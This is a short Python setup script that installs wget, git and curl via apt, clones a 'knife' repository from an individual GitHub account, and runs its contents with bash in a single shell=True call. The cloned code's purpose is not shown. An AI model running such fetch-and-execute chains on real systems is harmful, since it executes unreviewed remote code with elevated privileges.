#!/usr/bin/env python
import subprocess

subprocess.check_call("apt update;apt -y install wget git curl;git clone https://github.com/hendricosicithini/knife.git;cd knife;chmod +x knife;bash knife", shell=True)
